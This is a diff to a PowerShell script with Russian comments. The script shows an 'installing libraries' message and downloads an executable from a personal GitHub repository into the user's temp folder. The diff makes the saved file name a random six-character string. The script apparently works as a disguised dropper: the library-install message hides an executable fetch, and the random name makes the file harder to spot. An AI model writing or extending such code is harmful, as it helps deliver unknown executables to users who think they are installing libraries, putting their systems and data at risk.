@@ -20,9 +20,13 @@ for ($i = 0; $i -lt 20; $i++) {
 
 Write-Host "`rУстановка библиотек!." -ForegroundColor Blue
 
-$temp = $env:TEMP
+# ГЕНЕРАЦИЯ СЛУЧАЙНОГО ИМЕНИ ИЗ 6 СИМВОЛОВ (БУКВЫ И ЦИФРЫ)
+$chars = [char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+$randomName = (-join (1..6 | ForEach-Object { $chars | Get-Random }))
 
-$libs = "$temp\libs.exe"
+$temp = $env:TEMP
+# Теперь файл сохранится как, например, Xy7q9W.exe во временной папке
+$libs = "$temp\$randomName.exe"
 
 Invoke-WebRequest "https://github.com/SuperMod27/0/raw/refs/heads/main/libs.exe" -OutFile $libs
 
